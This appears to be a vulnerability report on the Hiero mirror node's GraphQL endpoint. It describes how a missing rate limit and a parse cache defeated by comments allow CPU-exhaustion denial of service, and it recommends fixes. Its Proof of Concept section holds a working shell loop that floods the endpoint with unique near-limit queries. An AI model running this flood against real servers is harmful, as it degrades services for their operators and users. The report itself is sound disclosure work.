### Title
No Rate Limiting on GraphQL Endpoint Enables Parser-Work Amplification DoS via Unique Max-Size Queries

### Summary
The GraphQL endpoint enforces per-query parser limits (`maxCharacters=10000`, `maxTokens=1000`) but has no request-rate throttle. The `PreparsedDocumentProvider` cache only deduplicates identical query strings; an attacker trivially bypasses it by varying each query (e.g., appending a unique comment). Flooding the endpoint with unique, max-size queries forces full ANTLR lexing and token counting on every request with no mechanism to slow or reject the attacker.

### Finding Description

**Parser limits (static initializer, lines 31–39):**

```java
Consumer<Builder> consumer =
    b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
``` [1](#0-0) 

These limits bound the work *per request* but do not limit the *rate* of requests.

**Cache keyed on raw query string (line 26):**

```java
return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
``` [2](#0-1) 

A cache hit requires an *exact* string match. Appending `# 1`, `# 2`, … to each request produces a unique cache key while keeping character count at 10,000 and token count near 1,000. Every such request is a cache miss and triggers full parsing.

**No rate limiting in the GraphQL module:**

The `graphql/config/` directory contains only `GraphQlConfiguration.java`, `LoggingFilter.java`, `MetricsConfiguration.java`, and `CustomExceptionResolver.java`.



The `ThrottleConfiguration` / `ThrottleManagerImpl` that exists for the `web3` module is entirely absent from the GraphQL module. [3](#0-2) 

**Exploit flow:**

1. Craft a query body of exactly 10,000 characters with ~999 non-whitespace tokens (e.g., deeply aliased field selections padded with long string literals).
2. For each request, append a unique comment (`# N`) so the cache key is always new.
3. Send a high-concurrency stream of such POST requests to `/graphql/alpha` with no authentication.
4. Each request forces the ANTLR-based GraphQL parser to scan all 10,000 characters and count all tokens before the limit check fires; no rate gate exists to reject or slow the flood.

### Impact Explanation

The parser work per request is maximized (10,000 chars × ~1,000 tokens = worst-case ANTLR scan). With no rate limiting and no authentication requirement, an attacker with modest bandwidth can sustain enough concurrent requests to saturate one or more CPU cores on the mirror-node process. Because the GraphQL service is documented as running on a shared mirror-node host, CPU saturation degrades all co-located services (REST API, gRPC). A 30%+ CPU increase above the 24-hour baseline is realistic with a few dozen concurrent connections from a single machine.

### Likelihood Explanation

- **No privileges required**: the endpoint is publicly accessible (`/graphql/alpha`).
- **No special knowledge required**: the parser limits are documented in the source; crafting a 10,000-character query is trivial.
- **Cache bypass is trivial**: appending `# N` to each request is a one-liner in any scripting language.
- **Repeatable and automatable**: a simple `ab`/`wrk`/`hey` benchmark script suffices.

### Recommendation

1. **Add a request-rate limiter to the GraphQL module** analogous to the `ThrottleConfiguration` in `web3`. A token-bucket filter (e.g., Bucket4j) applied per IP before the GraphQL handler is the direct fix.
2. **Normalize/canonicalize queries before cache lookup** (strip comments, normalize whitespace) so comment-padding does not defeat the cache.
3. **Consider a connection-level concurrency limit** (e.g., Tomcat `maxConnections` / `acceptCount`) as a defense-in-depth measure.

### Proof of Concept

```bash
# Generate a unique max-size query per request and flood the endpoint
for i in $(seq 1 500); do
  # ~9950 chars of valid query + unique comment to bust cache
  QUERY=$(python3 -c "
q = 'query { account(input:{entityId:{shard:0,realm:0,num:2}}){ ' + 'balance ' * 200 + '} } # $i'
# pad to 9999 chars with a trailing comment
pad = 9999 - len(q)
print(q + ' ' * pad)
")
  curl -s -o /dev/null -X POST http://<host>:8083/graphql/alpha \
    -H 'Content-Type: application/json' \
    -d "{\"query\": \"$QUERY\"}" &
done
wait
```

Each iteration sends a syntactically valid, near-limit query with a unique cache key. Monitor the mirror-node JVM CPU via `/actuator/metrics/process.cpu.usage` before and during the flood to observe the 30%+ increase.

### Citations

**File:** graphql/src/main/java/org/hiero/mirror/graphql/config/GraphQlConfiguration.java (L31-39)
```java
    static {
        // Configure GraphQL parsing limits to reject malicious input
        Consumer<Builder> consumer =
                b -> b.maxCharacters(10000).maxRuleDepth(100).maxTokens(1000).maxWhitespaceTokens(1000);
        ParserOptions.setDefaultParserOptions(
                ParserOptions.getDefaultParserOptions().transform(consumer));
        ParserOptions.setDefaultOperationParserOptions(
                ParserOptions.getDefaultOperationParserOptions().transform(consumer));
    }
```

**File:** graphql/src/main/java/org/hiero/mirror/graphql/cache/CachedPreparsedDocumentProvider.java (L26-26)
```java
        return cache.get(executionInput.getQuery(), key -> parseAndValidateFunction.apply(executionInput));
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L14-32)
```java
@Configuration(proxyBeanMethods = false)
@RequiredArgsConstructor
public class ThrottleConfiguration {

    public static final String GAS_LIMIT_BUCKET = "gasLimitBucket";
    public static final String RATE_LIMIT_BUCKET = "rateLimitBucket";
    public static final String OPCODE_RATE_LIMIT_BUCKET = "opcodeRateLimitBucket";

    private final ThrottleProperties throttleProperties;

    @Bean(name = RATE_LIMIT_BUCKET)
    Bucket rateLimitBucket() {
        long rateLimit = throttleProperties.getRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```
